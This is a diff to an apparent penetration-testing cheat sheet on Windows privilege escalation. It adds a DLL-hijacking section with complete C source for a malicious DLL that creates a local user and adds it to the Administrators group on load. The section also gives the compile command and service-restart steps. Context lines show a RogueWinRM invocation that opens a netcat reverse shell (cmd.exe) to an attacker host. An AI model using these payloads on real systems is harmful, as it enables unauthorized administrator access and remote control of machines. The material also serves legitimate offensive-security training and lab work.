@@ -4421,32 +4421,66 @@ Click the `Ease of Access` button on the logon screen to get a shell with `NT Au
 .\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
 ```
 
-##### Registry Handling
+##### DLL Hijacking
 
-###### Enable Colored Output
+###### Standard Search Order
+
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
 
 ```c
-reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+icacls .\PATH\TO\BINARY\<BINARY>.exe
+Restart-Service <SERVICE>
+$env:path
 ```
 
-Then open a new Terminal Window.
+###### DLL Abuse
 
-###### Check for Auto Run Programs
+###### customdll.cpp
 
 ```c
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+        i = system ("net user <USERNAME> <PASSWORD> /add");
+        i = system ("net localgroup administrators <USERNAME> /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
 ```
 
-###### Get Registry Key Information
+###### Compiling customdll.cpp
 
 ```c
-req query <REGISTRY_KEY>
+x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll
 ```
 
-####### Modify Registry Key
+Copy the `.dll` file to the desired path.
 
 ```c
-reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
+Restart-Service <SERVICE>
+Get-LocalGroupMember administrators
 ```
 
 ##### Leveraging Windows Services
